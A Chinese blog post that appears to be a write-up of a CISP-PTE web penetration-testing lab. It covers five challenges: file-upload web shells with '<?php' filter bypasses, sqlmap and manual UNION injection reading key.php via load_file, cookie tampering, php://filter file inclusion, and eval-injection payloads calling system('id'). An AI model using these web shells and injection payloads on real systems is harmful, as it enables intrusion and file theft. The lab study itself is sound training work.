---
layout: post
title: CISP-PTE Web
subtitle: CISP-PTE Web
date: 2025-08-17 08:44
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
number headings: first-level 2, max 4, 1.1., auto
published: true
---
## 1. 信息搜集

扫描网段

```shell
namp -sn 192.168.163.0/24
```

发现主机：192.168.163.132

![image.png](https://img.ghostliner.top/sAg7Cf.png)

```shell
nmap -T5 -sS -p- 192.168.163.132
```

![image.png](https://img.ghostliner.top/DLKSpv.png)

## 2. web1：文件上传

**端口**：32768

![image.png](https://img.ghostliner.top/Vxhg0i.png)

上传普通图片，成功

![image.png](https://img.ghostliner.top/PpVx6G.png)

`http://192.168.163.132:32768/uploads/31457.jpg`

上传 `shell.jpg`

![image.png](https://img.ghostliner.top/AvL5Wi.png)

![image.png](https://img.ghostliner.top/Or62km.png)

`eval` 改为 `system` 仍失败

```php
GIF89a
<?php SYSTEM($_REQUEST[a]);?>
```

测试发现对 `<?php` 进行了过滤，可写成以下形式

```php
<?eval($_POST['cmd']);echo 123;?>
<?=eval($_REQUEST['cmd']);echo 123;?>
<script language="php">eval($_REQUEST['cmd']);</script>
```

上传成功

![image.png](https://img.ghostliner.top/b5fzbi.png)

![image.png](https://img.ghostliner.top/mTh1C2.png)

蚁剑连接获取 key

![image.png](https://img.ghostliner.top/Ri8xjv.png)

## 3. web2：SQL 注入

**端口**：32769

![image.png](https://img.ghostliner.top/yrE2G9.png)

**测试弱密码**

用户名：admin，密码：123456，登录成功

![image.png](https://img.ghostliner.top/t7hmX6.png)

访问 key.cisp 显示 404

![image.png](https://img.ghostliner.top/9ZJzRx.png)

访问 `key.php` 显示空白，说明存在 key.php 文件

![image.png](https://img.ghostliner.top/Y9yCKq.png)
### 3.1. bp 目录扫描

设置 payload

![image.png](https://img.ghostliner.top/X4gQAs.png)

![image.png](https://img.ghostliner.top/ysjHfd.png)

![image.png](https://img.ghostliner.top/9soGyu.png)

![image.png](https://img.ghostliner.top/rjm0wM.png)

![image.png](https://img.ghostliner.top/MINsSl.png)

使用 bp 目录扫描未发现其他路径

### 3.2. sqlmap 测试

发现 uid 参数疑似可注入

![image.png](https://img.ghostliner.top/Lmxj4H.png)

sqlmap 测试漏洞

```shell
sqlmap.py -u "http://192.168.163.132:32769/?m=set&o=useredit&uid=2" -p uid --proxy="http://127.0.0.1:8080" --cookie="PHPSESSID=etnodd8kfkuejkj0i1i07fehr7" --dbs
```

发现漏洞，获取数据库

![image.png](https://img.ghostliner.top/EkZnBy.png)

查看 payload

![image.png](https://img.ghostliner.top/3b4DTH.png)

也可在 bp 上查看

![image.png](https://img.ghostliner.top/Tg93sr.png)

确定为单引号闭合，使用 `-- -` 注释，列数为 10

### 3.3. load_file 读取文件

手动测试，使用 `load_file` 获取文件

```sql
uid=-2' union select 1,2,3,4,5,6,7,8,9,10 -- -
```

![image.png](https://img.ghostliner.top/JsTPhG.png)

```sql
uid=-2' union select 1,load_file('/var/www/html/key.php'),3,4,5,6,7,8,9,10 -- -
```

![image.png](https://img.ghostliner.top/gqpUFh.png)

### 3.4. 其他 sql 注入漏洞

**就诊记录列表页面存在数字型注入**

```r
http://192.168.163.135:32769/?m=record&o=indexlist&rid=-2 union select 1,2,3,4,database(),6,7,8-- &did=all
```

**患者页面搜索框存在模糊查询注入**

![image.png](https://img.ghostliner.top/tzSF4C.png)

有 15 列

```sql
Payload: name=%E5%88%98' UNION ALL SELECT CONCAT(0x716a6a7671,0x7562746376476552685441466278697472765a6b444942576450454c4b4277554f4f535253424577,0x717a627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&submit=%E6%9F%A5%E6%89%BE%E6%82%A3%E8%80%85
```

5、14、11 有回显

![image.png](https://img.ghostliner.top/9wMzHs.png)

## 4. web3：失效的访问控制

**端口**：32770

![image.png](https://img.ghostliner.top/O0YghJ.png)

bp 抓包

![image.png](https://img.ghostliner.top/tu2mZO.png)

鼠标选中，直接解码

![image.png](https://img.ghostliner.top/A5inkI.png)

修改请求头

```ini
isadmin=true
username=YWRtaW4%3d
```

![image.png](https://img.ghostliner.top/ncI3Xt.png)

获取 flag

![image.png](https://img.ghostliner.top/UYrMTr.png)

## 5. web4：文件包含

**端口**：32771

![image.png](https://img.ghostliner.top/SiW3yF.png)

```r
http://192.168.163.132:32771/index.php?file=key.cisp
```

![image.png](https://img.ghostliner.top/Yq47ht.png)

```r
http://192.168.163.132:32771/index.php?file=php://filter/convert.base64-encode/resource=key.cisp
```

![image.png](https://img.ghostliner.top/vfUaIC.png)

![image.png](https://img.ghostliner.top/tgK7MW.png)

## 6. web5：命令执行

![image.png](https://img.ghostliner.top/nzcc3z.png)

```php
<?php
error_reporting(0);
include "key4.php";
$a = $_GET['a'];
eval("\$o=strtolower(\"$a\");");
echo $o;
show_source(__FILE__);
?>
```

`$a` 被直接拼进了 `eval` 里，虽然有引号包裹，但依然可能闭合字符串、逃逸到 PHP 代码上下文。

`\` 为转义符，去除后分析代码

```php
$o=strtolower("$a");
```

**要点**：
- 打破 `strtolower("...")` 里的字符串，写入自己的代码，就可以命令执行。

payload:

```php
a=");system("id");//
a=");system("id
a=${system("id")}
```

拼接成

```php
$o=strtolower("");system('id');//");
$o=strtolower("");system("id");
$o=strtolower("${system("id")}");
```
